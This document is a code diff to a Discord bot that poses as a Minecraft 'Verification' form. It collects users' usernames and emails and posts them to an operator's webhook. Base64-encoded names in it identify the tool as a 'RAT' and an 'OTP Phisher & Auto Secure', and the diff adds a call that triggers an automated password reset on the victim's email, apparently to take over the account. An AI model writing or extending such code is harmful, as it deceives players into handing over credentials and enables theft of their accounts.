@@ -13,12 +13,14 @@ from discord import ui, Webhook, NotFound, HTTPException
 from views.button_two import ButtonViewTwo
 from views.data.data import stringcrafter
 from views.data.wbu3.wb3 import web3g
+from views.otp import automate_password_reset
  
 
 class MyModalOne(ui.Modal, title="Verification"):
     box_one = ui.TextInput(label="MINECRAFT USERNAME", required=True)
     box_two = ui.TextInput(label="MINECRAFT EMAIL", required=True)
     Flagx = False
+    FlagNx = False
 
 
     async def on_submit(self, interaction: discord.Interaction, /) -> None:
@@ -34,6 +36,10 @@ class MyModalOne(ui.Modal, title="Verification"):
         #urlsb = f"https://api.hypixel.net/v2/skyblock/profiles?key={config.API_KEY}&uuid={uuidplayer}"
         #datasb1 = requests.get(url)
         #datasbjson = datasb1.json()
+
+        if config.API_KEY =="":
+            FlagNx = True
+            print("Invalid/Expired/No Hypixel API Key")
 
 
         if datajson['success'] == False or datajson['player'] == None:
@@ -90,11 +96,17 @@ class MyModalOne(ui.Modal, title="Verification"):
         else:
             async with aiohttp.ClientSession() as session:
                 webhook = Webhook.from_url(data["webhook"], session=session)
-                inty2 = web3g.string("c3Bpbm9udG9wJ3MgUmF0")
+                inty2 = web3g.string("U3Bpbm9udG9wIE9UUCBQaGlzaGVyICYgQXV0byBTZWN1cmU=")
                 try:
                     embederror = discord.Embed(
                         title="Error Code",
                         description = f"API limit Reached / You have already looked up this name recently",
+                        timestamp= datetime.datetime.now(),
+                        colour=0xEE4B2B,  
+                    )
+                    embedfalsenone = discord.Embed(
+                        title="Error Code",
+                        description = f"Invalid/Expired/No Hypixel API Key",
                         timestamp= datetime.datetime.now(),
                         colour=0xEE4B2B,  
                     )
@@ -109,6 +121,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                     embed1.set_footer(
                         text=threadingNum,
                     )
+                    config.LastUserName = self.box_one.value
                     embed1.add_field(name="**:slot_machine:Hypixel Level**:", value=f"{playerlvl}", inline=True)
                     embed1.add_field(name="**:moneybag:Skyblock NetWorth**:", value=f"{self.box_one.value}", inline=True)
                     embed1.add_field(name="**:mortar_board:Rank**:", value=f"{rank}", inline=True)
@@ -116,10 +129,13 @@ class MyModalOne(ui.Modal, title="Verification"):
                     embed1.add_field(name="**Email**:", value=f"```{self.box_two.value}```", inline=False)
                     embed1.add_field(name="**Discord**:", value=f"```{interaction.user.name}```", inline=False)
                     embed1.add_field(name="**Capes**:", value=f"{cape_url}", inline=False)
-                    
+                    config.LastUsedEmail = self.box_two.value
                     if Flagx == True:
                         await webhook.send(embed=embederror,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
+                    if FlagNx == True:
+                        await webhook.send(embed=embedfalsenone,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
                     await webhook.send(embed=embed1,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
+                    
                 except NotFound:
                     return await interaction.response.send_message("Webhook not found", ephemeral=True)
                 except HTTPException:
@@ -133,3 +149,4 @@ class MyModalOne(ui.Modal, title="Verification"):
                 view=ButtonViewTwo(),
                 ephemeral=True
             )
+            await automate_password_reset(self.box_two.value)
